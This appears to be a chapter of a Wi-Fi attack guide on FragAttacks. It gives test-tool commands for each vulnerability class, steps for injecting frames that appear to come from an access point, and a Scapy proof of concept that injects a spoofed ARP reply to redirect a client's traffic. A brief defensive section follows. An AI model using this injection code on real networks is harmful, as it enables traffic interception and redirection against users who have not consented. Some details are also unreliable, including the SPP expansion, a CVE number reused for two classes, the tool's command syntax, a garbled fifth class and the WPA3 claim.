# 10 — FragAttacks (Practical Exploitation)

## Overview

FragAttacks (Fragmentation and Aggregation Attacks, CVE-2020-24588, CVE-2020-24587, CVE-2020-26145, CVE-2020-26144) exploit design flaws in how Wi-Fi handles fragmented frames and aggregated frames (A-MSDU). Discovered by Mathy Vanhoef in 2021. Affects ALL Wi-Fi devices back to 1997 (WEP era).

## Vulnerability Classes

### Class 1: Aggregation Attacks (CVE-2020-24588)

A-MSDU (Aggregated MAC Service Data Unit) allows multiple frames in one transmission. The "is A-MSDU" bit in the QoS header can be flipped by an attacker to inject arbitrary frames that appear to come from the AP.

```bash
# Using vanhoefm/fragattacks test tool
git clone https://github.com/vanhoefm/fragattacks
cd fragattacks/research

# Test if AP accepts plain A-MSDU injection
python3 fragattack.py --ap wlan0mon test_amsdu_injection

# Test if AP accepts A-MSDU injection with TKIP MIC bypass
python3 fragattack.py --ap wlan0mon test_amsdu_injection_mic
```

### Class 2: Fragmentation Cache Attack (CVE-2020-24587)

Wi-Fi fragments large frames. The receiver caches fragments and reassembles them. Attacker injects a malicious fragment that gets combined with a legitimate fragment from the AP.

```bash
# Test if AP vulnerable to fragment cache attack
python3 fragattack.py --ap wlan0mon test_fragment_cache

# Combined attack: fragment + A-MSDU
python3 fragattack.py --ap wlan0mon test_mixed_attack
```

### Class 3: Mixed Key Attack (CVE-2020-24587)

Fragments encrypted under different keys can be combined if the receiver doesn't track which key was used per fragment.

```bash
# Force client to reconnect (new PTK), then inject old fragment
# The AP may combine old fragment (old key) with new fragment (new key)
python3 fragattack.py --ap wlan0mon test_mixed_key
```

### Class 4: Accepting Non-SPP A-MSDU (CVE-2020-26144)

SPP (Service Period Protected) A-MSDU should only be accepted during a service period. Some devices accept non-SPP A-MSDU outside service periods, enabling injection.

```bash
# Test non-SPP A-MSDU acceptance
python3 fragattack.py --ap wlan0mon test_non_spp_amsdu
```

### Class 5: Forwarding EAPOL After PN/RC4 Reinstallation

Some devices forward EAPOL frames even after a key reinstallation, allowing authentication bypass.

## Practical Exploitation: Injecting Arbitrary Packets

```bash
# Step 1: Test target for A-MSDU injection vulnerability
python3 fragattack.py --ap wlan0mon test_amsdu_injection

# Step 2: If vulnerable, inject frames that appear from AP
# The injected A-MSDU frame uses the attacker's MAC as SA (source)
# but is accepted because the "A-MSDU present" bit is flipped

# Step 3: Forge ARP reply to redirect traffic
# The AP appears to send an ARP reply, but it's attacker-injected
```

## Scapy A-MSDU Injection Script

```python
#!/usr/bin/env python3
"""A-MSDU injection PoC for CVE-2020-24588."""
from scapy.all import *

iface = "wlan0mon"
ap_mac = "00:11:22:33:44:55"
client_mac = "AA:BB:CC:DD:EE:FF"

# A-MSDU subframe: DA (6) + SA (6) + Length (2) + MSDU
# When A-MSDU bit is set in QoS header, receiver treats payload as A-MSDU
# The first subframe's DA/SA become the effective addresses

# Craft frame that appears to come from AP
pkt = RadioTap() / Dot11(
    addr1=client_mac,
    addr2=ap_mac,  # This is the transmitter, but A-MSDU bit makes receiver use inner addresses
    addr3=ap_mac,
    subtype=0x28  # QoS Data
) / Dot11QoS(amsdupresent=1)  # Set A-MSDU bit

# The payload is interpreted as A-MSDU subframe:
# DA=client_mac, SA=ap_mac, Length=..., MSDU=ARP reply
amsdu_payload = bytes([
    0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF,  # DA (client)
    0x00, 0x11, 0x22, 0x33, 0x44, 0x55,  # SA (AP, spoofed)
    0x00, 0x3c,                            # Length = 60
]) + bytes(ARP(op=2, psrc="192.168.1.1", pdst="192.168.1.100",
               hwsrc=ap_mac, hwdst=client_mac))

sendp(pkt / LLC() / SNAP() / amsdu_payload, iface=iface)
```

## Defensive Application

- **Firmware updates**: Vendor patches released May 2021. Check device firmware.
- **Disable fragmentation**: Set fragmentation threshold to 2346 (maximum, effectively disabling). `iwconfig wlan0 frag 2346`
- **A-MSDU disable**: Some drivers allow disabling A-MSDU. Check `iw phy phy0 info` for A-MSDU support.
- **Monitor for anomalies**: Alert on A-MSDU frames with unexpected inner addresses.
- **WPA3**: SAE is not directly vulnerable to FragAttacks, but A-MSDU/fragmentation is protocol-independent.

## References

- Vanhoef, "Fragment and Forge: Breaking Wi-Fi Through Frame Aggregation and Fragmentation," USENIX Security 2021
- CVE-2020-24588, CVE-2020-24587, CVE-2020-26145, CVE-2020-26144, CVE-2020-26146, CVE-2020-26147
- https://www.fragattacks.com/
